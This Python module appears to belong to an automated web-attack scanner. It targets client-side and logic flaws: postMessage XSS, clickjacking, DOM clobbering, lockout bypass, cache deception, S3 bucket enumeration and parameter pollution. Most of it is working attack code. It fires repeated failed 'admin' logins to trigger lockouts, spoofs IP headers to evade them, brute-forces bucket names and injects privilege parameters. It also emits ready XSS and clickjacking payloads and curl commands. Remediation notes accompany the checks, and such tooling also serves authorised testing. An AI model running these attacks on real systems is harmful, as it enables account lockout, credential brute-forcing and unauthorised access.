"""
TheMasterRecon AI — Client-Side Logic Attack Vectors
PostMessage XSS, Clickjacking, DOM Clobbering, Account Lockout Bypass,
Web Cache Deception, S3 Bucket Brute, HTTP Parameter Pollution.
"""
import re, logging, urllib.parse, time, random, string
from typing import List

log = logging.getLogger("elite.client_logic")

try:
    from scanner import _get, _req, F, _jitter_sleep
except ImportError:
    def _get(url, **kw): return None
    def _req(url, **kw): return None
    def F(bug, sev, url, title, **kw): return {"bug":bug,"severity":sev,"url":url,"title":title,**kw}
    def _jitter_sleep(a,b): pass


def check_postmessage_xss(targets: List[str], endpoints: List[str]) -> List[dict]:
    """Detect postMessage handlers without origin validation."""
    findings = []
    DANGEROUS_SINKS = ["innerHTML","document.write","eval(","Function(","setTimeout(",
                       "setInterval(","location.href","location.replace","src=","srcdoc="]
    MISSING_ORIGIN_CHECK = r"addEventListener\s*\(\s*['\"]message['\"]"
    ORIGIN_CHECK_PATTERN  = r"event\.origin|message\.origin|origin\s*===|origin\s*!=="

    for ep in endpoints[:100]:
        try:
            r = _get(ep, timeout=8)
            if not r: continue
            body = r[2]
            if not re.search(MISSING_ORIGIN_CHECK, body): continue
            has_origin_check = bool(re.search(ORIGIN_CHECK_PATTERN, body))
            has_dangerous_sink = any(sink in body for sink in DANGEROUS_SINKS)
            if not has_origin_check and has_dangerous_sink:
                sink = next(s for s in DANGEROUS_SINKS if s in body)
                findings.append(F("xss","high", ep,
                    "PostMessage XSS — missing origin validation + dangerous sink",
                    sink=sink,
                    poc=f"""<!-- PoC: host this and open in browser -->
<iframe src="{ep}" id="f"></iframe>
<script>
  document.getElementById('f').onload = function(){{
    document.getElementById('f').contentWindow.postMessage(
      '<img src=x onerror=alert(document.domain)>', '*');
  }};
</script>""",
                    impact="Cross-origin JavaScript execution. Cookie/token theft. Page defacement. Phishing within trusted origin.",
                    remediation="Always validate event.origin before processing postMessage. Use allowlist of trusted origins.",
                    confidence=80))
        except Exception:
            pass
    return findings


def check_clickjacking(targets: List[str]) -> List[dict]:
    """Check for missing X-Frame-Options and CSP frame-ancestors on sensitive pages."""
    findings = []
    SENSITIVE_PATHS = ["/login","/admin","/account","/settings","/profile",
                       "/payment","/checkout","/transfer","/2fa","/change-password",
                       "/delete-account","/oauth","/auth","/dashboard"]

    for base in targets[:30]:
        for path in SENSITIVE_PATHS[:6]:
            url = base.rstrip("/") + path
            try:
                r = _get(url, timeout=8)
                if not r or r[0] not in [200]: continue
                st, hdrs, body = r
                hdrs_lower = {k.lower():v for k,v in hdrs.items()} if isinstance(hdrs,dict) else {}
                xfo  = hdrs_lower.get("x-frame-options","")
                csp  = hdrs_lower.get("content-security-policy","")
                has_xfo  = bool(xfo) and xfo.upper() in ["DENY","SAMEORIGIN"]
                has_fa   = "frame-ancestors" in csp.lower()
                if not has_xfo and not has_fa:
                    poc_html = f"""<!-- Clickjacking PoC — save as poc.html and open in browser -->
<!DOCTYPE html>
<html>
<head><style>
iframe {{ opacity: 0.1; position: absolute; top: 0; left: 0; width: 100%; height: 100%; z-index: 2; }}
div   {{ position: absolute; top: 200px; left: 200px; z-index: 1; }}
</style></head>
<body>
  <iframe src="{url}"></iframe>
  <div><button onclick="alert('Victim clicked hidden action!')">Claim Free Prize</button></div>
</body>
</html>"""
                    findings.append(F("misconfig","medium", url,
                        f"Clickjacking — {path} frameable without restrictions",
                        missing_xfo=not has_xfo, missing_fa=not has_fa,
                        poc=poc_html,
                        impact="Trick users into clicking hidden UI elements (like Delete Account, Authorize OAuth, Transfer funds) within transparent iframe.",
                        remediation="Add X-Frame-Options: DENY or SAMEORIGIN header. Or use CSP: frame-ancestors 'self'.",
                        confidence=90))
            except Exception:
                pass
    return findings


def check_dom_clobbering(targets: List[str], endpoints: List[str]) -> List[dict]:
    """Detect DOM clobbering via id/name attributes that overwrite document.*."""
    findings = []
    CLOBBERABLE_PATTERNS = [
        r'id=["\'](\w+)["\'][^>]*>.*?</(?:a|form)',
        r'name=["\'](\w+)["\'][^>]*>.*?</(?:input|form)',
    ]
    DANGEROUS_READS = [
        r'document\.\w+\.\w+\(',
        r'window\[.*?\]\(',
        r'element\.innerHTML\s*=\s*\w+\.\w+',
    ]

    for ep in endpoints[:50]:
        try:
            r = _get(ep, timeout=6)
            if not r: continue
            body = r[2]
            has_dangerous_read  = any(re.search(p, body) for p in DANGEROUS_READS)
            has_clobberable_el  = any(re.search(p, body, re.S) for p in CLOBBERABLE_PATTERNS)
            if has_dangerous_read and has_clobberable_el:
                m = next((re.search(p, body, re.S) for p in CLOBBERABLE_PATTERNS if re.search(p, body, re.S)), None)
                id_name = m.group(1) if m else "unknown"
                findings.append(F("xss","medium", ep,
                    f"DOM Clobbering — {id_name} element may override document property",
                    element_id=id_name,
                    poc=f"# Inject: <a id={id_name} href=javascript:alert(1)>click</a>\n# Then: document.{id_name}.someMethod() → executes attacker JS",
                    impact="Override document.* properties to redirect code execution. Escalate to XSS in complex SPAs.",
                    remediation="Avoid accessing DOM elements via document.getElementById as object properties. Use strict CSP. Don't use user-controlled id/name values in JS logic.",
                    confidence=70))
        except Exception:
            pass
    return findings


def check_account_lockout_bypass(targets: List[str]) -> List[dict]:
    """Bypass account lockout by rotating IP headers."""
    findings = []
    IP_HEADERS = ["X-Forwarded-For","X-Real-IP","CF-Connecting-IP",
                  "X-Client-IP","True-Client-IP","X-Originating-IP"]
    LOGIN_PATHS = ["/login","/auth/login","/api/login","/signin","/api/signin",
                   "/account/login","/user/login","/admin/login"]

    for base in targets[:10]:
        for path in LOGIN_PATHS[:3]:
            url = base.rstrip("/") + path
            r = _get(url, timeout=5)
            if not r or r[0] != 200: continue
            body = r[2]
            if not re.search(r'(?:password|login|email|username)', body, re.I): continue

            # First: trigger lockout with 5 bad attempts
            for attempt in range(5):
                _req(url, method="POST",
                     data="username=admin&password=wrongpassword12345",
                     headers={"Content-Type":"application/x-www-form-urlencoded"},
                     timeout=5)

            # Check if locked
            r2 = _req(url, method="POST",
                      data="username=admin&password=wrongpassword12345",
                      timeout=5)
            if not r2: continue
            st2, hd2, bd2 = r2
            is_locked = any(s in bd2.lower() for s in ["locked","too many","rate limit","blocked","banned","429"])
            if not is_locked: continue

            # Now try bypassing with IP rotation
            for hdr in IP_HEADERS:
                fake_ip = f"10.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
                r3 = _req(url, method="POST",
                          data="username=admin&password=wrongpassword12345",
                          headers={"Content-Type":"application/x-www-form-urlencoded", hdr: fake_ip},
                          timeout=5)
                if not r3: continue
                st3, hd3, bd3 = r3
                if not any(s in bd3.lower() for s in ["locked","too many","rate limit","blocked"]):
                    findings.append(F("misconfig","high", url,
                        f"Account Lockout Bypass via {hdr} header rotation",
                        bypass_header=hdr,
                        poc=f"curl -X POST '{url}' -d 'username=admin&password=guess' -H '{hdr}: {fake_ip}'",
                        impact="Brute-force login credentials without lockout. Unlimited password guessing.",
                        remediation="Rate limit based on user/account, not IP. Don't trust client-supplied IP headers for rate limiting.",
                        confidence=92))
                    break
    return findings


def check_web_cache_deception(targets: List[str]) -> List[dict]:
    """Web cache deception — serve authenticated content via cached static paths."""
    findings = []
    AUTHENTICATED_PATHS = ["/account","/profile","/settings","/dashboard",
                           "/me","/user/profile","/api/me","/my-account"]
    STATIC_SUFFIXES = [".css",".js",".png",".jpg",".gif",".svg",".ico",".woff"]

    for base in targets[:15]:
        for auth_path in AUTHENTICATED_PATHS[:4]:
            auth_url = base.rstrip("/") + auth_path
            r = _get(auth_url, timeout=6)
            if not r or r[0] != 200: continue
            body = r[2]
            if not any(s in body.lower() for s in ["email","username","profile","account","user"]): continue

            for suffix in STATIC_SUFFIXES[:3]:
                test_url = auth_url + "/nonexistent" + suffix
                try:
                    r2 = _get(test_url, timeout=6)
                    if not r2: continue
                    st2, hd2, bd2 = r2
                    hdrs_lower = {k.lower():v for k,v in hd2.items()} if isinstance(hd2,dict) else {}
                    cache_ctrl = hdrs_lower.get("cache-control","")
                    age        = hdrs_lower.get("age","")
                    x_cache    = hdrs_lower.get("x-cache","")

                    is_cached = ("public" in cache_ctrl or age or
                                 "hit" in x_cache.lower() or "HIT" in x_cache)
                    if st2 == 200 and is_cached and len(bd2) > 100:
                        findings.append(F("misconfig","high", test_url,
                            f"Web Cache Deception — authenticated data potentially cached as static",
                            cache_headers={"cache-control":cache_ctrl,"age":age,"x-cache":x_cache},
                            poc=f"# Step 1 — victim visits:\ncurl '{test_url}'\n# Step 2 — attacker gets cached response:\ncurl '{test_url}'",
                            impact="CDN caches authenticated user profile/account pages as static files. Any anonymous visitor gets victim's data.",
                            remediation="Set Cache-Control: no-store on authenticated pages. Configure CDN to not cache based on auth cookies.",
                            confidence=75))
                        break
                except Exception:
                    pass
    return findings


def check_s3_bucket_brute(targets: List[str], company_name: str = "") -> List[dict]:
    """Brute-force S3 bucket names based on company/domain patterns."""
    findings = []
    if not company_name and targets:
        # Extract company from first target
        import urllib.parse as up
        host = up.urlparse(targets[0]).netloc.split(":")[0]
        parts = host.replace("www.","").split(".")
        company_name = parts[0] if parts else ""

    if not company_name: return []

    SUFFIXES = [
        "","backup","backups","dev","staging","prod","production",
        "static","assets","media","files","data","logs","archive",
        "internal","private","public","test","qa","deploy","release",
        "uploads","images","documents","reports","config","secrets",
        "database","dump","export","temp","tmp","old","legacy",
    ]

    bucket_urls = []
    for suffix in SUFFIXES[:30]:
        name = f"{company_name}-{suffix}" if suffix else company_name
        bucket_urls.extend([
            f"https://{name}.s3.amazonaws.com/",
            f"https://{name}.s3-us-east-1.amazonaws.com/",
            f"https://s3.amazonaws.com/{name}/",
        ])

    checked = set()
    for url in bucket_urls:
        if url in checked: continue
        checked.add(url)
        try:
            r = _get(url, timeout=8)
            if not r: continue
            st, hd, bd = r
            if st == 200 and any(s in bd for s in ["<Key>","<ListBucketResult","Contents","LastModified"]):
                bucket_name = url.split(".s3.")[0].replace("https://","")
                findings.append(F("expose","critical", url,
                    f"Public S3 Bucket — {bucket_name} is world-readable",
                    bucket=bucket_name,
                    poc=f"aws s3 ls s3://{bucket_name}/ --no-sign-request",
                    impact="Download all files from the bucket. May contain: source code, backups, credentials, PII, private documents.",
                    remediation="Set bucket ACL to Private. Enable S3 Block Public Access. Use bucket policies to restrict access.",
                    confidence=97))
            elif st == 403 and any(s in bd for s in ["AccessDenied","AllAccessDisabled","InvalidBucketPolicy"]):
                # Bucket exists but is private — still useful info
                bucket_name = url.split(".s3.")[0].replace("https://","")
                findings.append(F("expose","low", url,
                    f"S3 Bucket Exists (private) — {bucket_name}",
                    bucket=bucket_name,
                    poc=f"# Bucket exists but access denied:\ncurl '{url}'",
                    impact="Bucket name confirmed. Monitor for misconfiguration or try with valid AWS credentials.",
                    remediation="Ensure bucket name does not reveal sensitive information. Enable CloudTrail.",
                    confidence=90))
        except Exception:
            pass
        _jitter_sleep(0.05, 0.15)
    return findings


def check_http_parameter_pollution(targets: List[str], endpoints: List[str]) -> List[dict]:
    """HTTP Parameter Pollution — duplicate params, array injection, case variation."""
    findings = []
    POLLUTE_PAYLOADS = [
        # Duplicate params
        ("&role=admin", "duplicate privilege param"),
        ("&admin=true", "duplicate admin flag"),
        ("&debug=true", "debug mode param"),
        ("&_method=DELETE", "method override via body"),
        # Array injection
        ("&id[]=1&id[]=2", "array parameter injection"),
        ("&role[]=user&role[]=admin", "role array injection"),
    ]

    param_eps = [e for e in endpoints if "?" in e][:30]

    for ep in param_eps:
        base, params = ep.split("?", 1)
        for suffix, desc in POLLUTE_PAYLOADS[:3]:
            test_url = ep + urllib.parse.quote(suffix, safe="&=[]")
            try:
                r = _get(test_url, timeout=8)
                if not r: continue
                st, hd, bd = r

                # Compare with original
                r_orig = _get(ep, timeout=6)
                if not r_orig: continue
                orig_st, _, orig_bd = r_orig

                if st == 200 and orig_st in [200,403] and len(bd) > len(orig_bd) + 100:
                    if any(s in bd.lower() for s in ["admin","debug","true","elevated","privilege"]):
                        findings.append(F("idor","high", test_url,
                            f"HTTP Parameter Pollution — {desc}",
                            original_url=ep, polluted_url=test_url,
                            poc=f"curl '{test_url}'",
                            impact="Override request parameters to gain elevated privileges, bypass authorization, enable debug modes.",
                            remediation="Use only first (or last) occurrence of duplicate parameters consistently. Reject conflicting parameter values. Use strict input validation.",
                            confidence=75))
            except Exception:
                pass
    return findings
